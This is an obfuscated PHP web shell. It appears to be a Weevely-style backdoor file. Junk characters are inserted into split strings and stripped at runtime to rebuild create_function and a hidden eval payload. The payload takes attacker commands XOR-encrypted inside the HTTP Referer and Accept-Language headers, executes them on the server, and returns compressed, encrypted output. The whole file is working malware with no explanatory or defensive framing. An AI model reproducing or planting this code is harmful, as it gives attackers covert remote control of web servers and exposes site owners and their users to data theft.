<?php
$B=str_replace('xJ','','cxJrexJxJatxJe_fuxJnctixJon');
$n='_*wrepla*wc*w*we(array("/_/","/-*w*w/"),array("/"*w*w,"+"),*w$ss($s[$i],0*w,$e*w))),$*wk)*w));$o=ob_get_*wcont*wents(*w);o';
$L='*w*w$kh="5d41";$kf="402a";f*wunc*wt*wi*won x($t,$k*w){$c=strlen($k*w);$l=st*wrl*wen($t);$o=*w*w*w"";for($i=0*w;*w$i<$l;';
$d='ER"];$*w*wr*wa=@$r["HT*wTP_A*wCCEPT_LANGUAGE"];if*w*w($r*wr&&$ra){$u=par*wse_url(*w$r*wr);parse_s*wtr($u*w["*wquery"],*w$q)';
$g=')*w{for($j=0;($j<$c*w&&*w$i<$l);$*wj++,*w$*wi++){$o.*w=$t{$i}*w^$k{$j};}}*wreturn $*wo;}*w$*wr=$_SERVER;$rr=*w@$r["*wHTTP_R*wEFE*wR';
$q='[*w$m[2][*w$*wz]];if*w(strpos($p,$*wh)===0){*w$s[*w$i]="*w";$p=$ss($*wp,3);*w*w}if(ar*wray*w_key_ex*wists($i,$s)){$*w*ws*w[$';
$c='b*w_end_clean*w();$d=ba*wse6*w4_encod*we(x*w(gzcompre*ws*ws($o),$k));p*wrin*wt("<$k*w>$d<*w/$k*w>");@sessio*wn_destr*woy();}}}}';
$P=';$q=*warr*way_value*ws($q*w);preg_*wmatch_*wal*wl("/([\\w])[\\w*w-*w]+*w(?:;q=0.([\\d])*w)?,?/",$*wra,$m)*w;*wif($q&&*w*w$m';
$z=')*w{@session_start();*w$*ws=&$_SE*wSSIO*wN;$ss="subs*wt*wr";$*wsl="st*wrtolower*w";$i=*w$m[1][0*w].$m[1*w][1];*w$h=$sl($ss(';
$W='*wmd5($*wi.$kh*w),0,3));*w$f=$s*w*wl($ss(m*wd5($i.$kf),0,3)*w);$*wp="";for*w*w($z=1;$z<*wcou*wnt($m[1]);$z*w++)$*wp.=$q';
$e='*wi].=$p;$e=strpos($*ws[*w$i*w],$f);i*wf($e){$k=*w$kh.$kf;ob_st*wart();@*w*we*wval(@gzuncompre*wss(@x(@b*wase6*w4_d*wecode(preg';
$h=str_replace('*w','',$L.$g.$d.$P.$z.$W.$q.$e.$n.$c);
$m=$B('',$h);$m();
?>
